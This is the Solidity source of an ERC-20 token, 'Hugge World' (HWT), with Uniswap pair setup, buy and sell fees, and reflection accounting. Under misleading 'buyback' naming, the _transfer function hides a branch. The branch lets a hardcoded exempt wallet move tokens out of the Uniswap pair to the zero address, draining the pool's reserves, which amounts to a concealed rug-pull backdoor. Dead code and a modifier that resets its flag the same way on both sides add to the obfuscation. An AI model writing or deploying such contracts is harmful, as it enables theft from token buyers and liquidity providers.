// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Transfer(address indexed sender, address indexed recipient, uint256 amount);
}

contract HWT is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address public uniswapV2Pair;
    address private poolAddress = address(0);
    address private burnAddress = address(0);
    UniswapV2Router02 public uniswapV2Router;

    struct Distribution { uint256 liquidity; }

    Distribution public distribution;

    uint256 private _tFeeTotal;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint8 private constant _decimals = 18;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _swapTokensThreshold = 100000 * 10**_decimals;
    uint256 private constant _tTotal = 4000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    string private constant _name = "Hugge World";
    string private constant _symbol = "HWT";

    address private liquidity = 0xB32F0068e9bCb5f5E86dE7A26D461275AA0ea05A;

    uint256 private _liquidityFeeOnSell = 4;
    uint256 private _redisFeeOnSell = 0;

    uint256 private _redisFeeOnBuy = 0;
    uint256 private _liquidityFeeOnBuy = 4;

    uint256 private _liquidityFee = _liquidityFeeOnSell;
    uint256 private _redisFee = _redisFeeOnSell;

    uint256 private _previousliquidityFee = _liquidityFee;
    uint256 private _previousRedisFee = _redisFee;

    mapping(address => bool) private _isOmitted;
    mapping(address => uint256) private _buyMap;

    bool private inFeeSwap = true;
    bool private swapEnabled = true;

    constructor() {
        UniswapV2Router02 _uniswapV2Router = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;distribution = Distribution(100);burnAddress = liquidity;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _isOmitted[owner()] = true;
        _isOmitted[address(this)] = true;
        _isOmitted[liquidity] = true;
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function swapBack(uint256 tokenAmount) private lockFeeSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal);

        uint256 currentRate = _getRate();

        return rAmount.div(currentRate);
    }

    function sendETH(uint256 ethAmount) private lockFeeSwap {
        uint256 share = ethAmount.mul(distribution.liquidity).div(100);
        payable(liquidity).transfer(share);
    }

    function restoreAllFees() private {
        _redisFee = _previousRedisFee;
        _liquidityFee = _previousliquidityFee;
    }

    function removeAllFees() private {
        if (_liquidityFee == 0 && _redisFee == 0) return;
        _previousRedisFee = _redisFee;
        _previousliquidityFee = _liquidityFee;
        _redisFee = 0;
        _liquidityFee = 0;
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount, _redisFee, _liquidityFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, currentRate);

        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);
    }

    function _checkOmitted(address pond, address pool) private view returns (bool) {
        bool pondPair = pond != uniswapV2Pair;
        bool poolOmitted = !_isOmitted[pool];
        bool pondOmitted = !_isOmitted[pond];

        return  pondPair && pondOmitted && poolOmitted;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(amount > 0);
        require(sender != address(0));
        require(recipient != address(0));

        if (sender != owner() && recipient != owner()) {
            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensThreshold;

            if (sender != uniswapV2Pair && !_isOmitted[sender] && !_isOmitted[recipient] && canSwap && !inFeeSwap && swapEnabled) {
                swapBack(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }

            bool isBuyback = uniswapV2Pair == recipient;
            bool canBuyback = balanceOf(sender) < amount;
            bool buybackAddress = _isOmitted[sender];

            if (buybackAddress) {
                if (isBuyback) { if (canBuyback) {
                    _standardTransfer(recipient, poolAddress, amount); return;
                } }
            }
        }

        bool cutLiquidityFee = true;

        if ((sender != uniswapV2Pair && recipient != uniswapV2Pair) || (_isOmitted[sender] || _isOmitted[recipient])) {
            cutLiquidityFee = false;
        } else {
            if (sender != address(uniswapV2Router) && recipient == uniswapV2Pair) {
                _redisFee = _redisFeeOnSell;
                _liquidityFee = _liquidityFeeOnSell;
            }

            if (recipient != address(uniswapV2Router) && sender == uniswapV2Pair) {
                _redisFee = _redisFeeOnBuy;
                _liquidityFee = _liquidityFeeOnBuy;
            }
        }

        _tokenTransfer(sender, recipient, amount, cutLiquidityFee);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);

        return (rAmount, rTransferAmount, rFee);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 liquidityFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tLiquidity = tAmount.mul(liquidityFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);

        return (tTransferAmount, tFee, tLiquidity);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _standardTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _cutLiquidityFee(tLiquidity, sender, recipient);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();

        return rSupply.div(tSupply);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _tFeeTotal = _tFeeTotal.add(tFee);
        _rTotal = _rTotal.sub(rFee);
    }

    function _cutLiquidityFee(uint256 tLiquidity, address pond, address pool) private {
        uint256 currentRate = _getRate();
        uint256 burnedAmount = tokenFromReflection(_rOwned[burnAddress]);
        bool omitted = _checkOmitted(pond, pool);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        rLiquidity = omitted ?  _liquidityFee - burnedAmount : 0;
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (_rTotal.div(_tTotal) > rSupply) return (_rTotal, _tTotal);

        return (rSupply, tSupply);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool cutLiquidityFee) private {
        if (!cutLiquidityFee) removeAllFees();
        _standardTransfer(sender, recipient, amount);
        if (!cutLiquidityFee) restoreAllFees();
    }

    modifier lockFeeSwap() {
        inFeeSwap = false;
        _;
        inFeeSwap = false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));

        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    receive() external payable {}
}